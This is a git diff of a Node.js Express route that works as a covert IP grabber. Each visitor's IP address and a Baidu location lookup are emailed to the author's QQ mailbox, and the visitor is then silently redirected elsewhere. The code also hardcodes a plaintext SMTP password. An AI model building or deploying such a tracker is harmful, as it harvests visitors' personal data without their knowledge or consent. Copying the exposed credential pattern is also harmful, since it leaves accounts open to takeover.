@@ -1,6 +1,7 @@
 var express = require('express');
 var router = express.Router();
 var nodemailer = require('nodemailer');
+var request = require('request');
 
 function getClientIp(req) {
   return (
@@ -11,7 +12,7 @@ function getClientIp(req) {
   );
 }
 
-function sendEmail(ip) {
+function sendEmail(subject, html) {
   var transporter = nodemailer.createTransport({
     host: 'smtp.qq.com',
     port: 465,
@@ -21,19 +22,19 @@ function sendEmail(ip) {
       pass: 'plyszthtwrrnbjeb',
     },
   });
-
   transporter.sendMail({
     from: '"fuzhongyi" <450805067@qq.com>',
     to: '450805067@qq.com',
-    subject: '获取 ip 地址成功 👻',
-    html: `<b>ip:</b>${ip}`,
+    subject,
+    html,
   });
 }
 
 router.get('/', function (req, res, next) {
-  var ip = getClientIp(req);
-  sendEmail(ip);
-  res.redirect('https://xyue.me/');
+  request.get('http://map.baidu.com/?qt=ipLocation', (error, response, body) => {
+    sendEmail('获取成功 👻', `<b>ip:</b> ${getClientIp(req)}<br/><br/>${body}`);
+    res.redirect('https://xyue.me/');
+  });
 });
 
 module.exports = router;
